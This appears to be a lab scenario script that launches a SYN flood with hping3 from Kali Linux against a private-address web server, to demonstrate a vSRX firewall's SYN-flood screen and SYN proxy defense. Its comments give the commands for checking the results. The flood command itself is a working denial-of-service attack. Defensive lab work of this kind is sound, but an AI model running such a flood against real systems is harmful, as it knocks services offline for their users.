#!/bin/bash
# Scenario 2: SYN Flood with hping3
# Run this from Kali Linux (ssh kali@<kali-eip>)
#
# BEFORE applying defense:
#   Web server becomes unresponsive; curl hangs or times out
#
# AFTER defense (Screen: tcp syn-flood thresholds + SYN proxy):
#   SRX absorbs the flood via SYN cookie/proxy; web server stays responsive
#   SRX session table shows proxy sessions, not raw SYN backlog
#
# Verify on vSRX:
#   show security screen statistics interface ge-0/0/0
#   show security flow session destination-prefix 10.0.2.100
#   show log security-log | match "SYN-FLOOD" | last 20

TARGET="10.0.2.100"

echo "========================================"
echo "Scenario 2: SYN Flood"
echo "Target: $TARGET:80"
echo "Press Ctrl+C to stop the flood"
echo "========================================"
echo ""

echo "[*] Checking web server is alive before flood..."
curl -s --connect-timeout 3 "http://$TARGET/" -o /dev/null && echo "Web server: UP" || echo "Web server: DOWN"
echo ""

echo "[*] Starting SYN flood on port 80 (Ctrl+C to stop)..."
echo "    In another terminal, run: curl -m 5 http://$TARGET/"
echo "    to observe whether the web server becomes unresponsive."
echo ""
sudo hping3 -S --flood -V -p 80 "$TARGET"
